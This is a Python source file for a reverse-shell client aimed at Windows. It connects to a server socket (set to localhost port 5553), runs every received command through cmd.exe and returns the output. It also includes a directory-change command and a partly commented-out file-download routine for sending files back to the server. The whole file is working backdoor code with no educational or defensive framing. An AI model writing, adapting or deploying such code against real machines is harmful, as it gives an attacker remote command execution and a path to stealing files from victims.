import os
import socket
import subprocess

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5553
SEPARATOR = "<SEP>"
BUFFER_SIZE = 128 * 1024

# create socket object 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connnect to the server
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    # receive command from the server 
    cmd = s.recv(BUFFER_SIZE).decode()

    if cmd.lower() == "exit":
        # break from the loop 
        break
    elif cmd[:2].lower() == "cd":
        # change directory
        os.chdir(cmd[3:])
        # get cwd 
        output = os.getcwd()
        s.send(output.encode())
    elif cmd[:8].lower() == "download":
        filename = cmd[9:]
        if os.path.isfile(filename):
            # debugging 
            output = "File exists."
            s.send(output.encode())
            print(output)

            '''
            # get metadata 
            file_size = os.path.getsize(filename)
            metadata = f"{filename}<sep>{file_size}"
            s.send(metadata.encode())
            
            # Indicate the start of file data transmission by receiving message confirmation from the server
            msg_conf = s.recv(1024).decode()
            print(f"Sending {filename} metadata: {msg_conf}")
            print("Sending file data...")

            # Send the file data
            with open(filename, "rb") as file:
                while True:
                    data = file.read(1024)
                    if not data:
                        break
                    s.send(data)

            # Close the file when the operation has finished
            file.close()
            print("File has been sent succesfully")
            '''
        else:
            output = "File doesn't exists."
            s.send(output.encode())
            print(output) # for debugging
    else:
        # run the command from the server 
        result = subprocess.run(["cmd.exe", "/C", cmd], capture_output=True)
        output = result.stdout.decode() + result.stderr.decode()
        if not output:
            # set the ouput into an empty string if the subprocess doesnt return anything
            output = "\r" # \r is carriage return. We use carriage return to (swap) te empty string because we get error when using empty string 
        # send message to the server 
        s.send(output.encode())

# close the connection 
s.close()
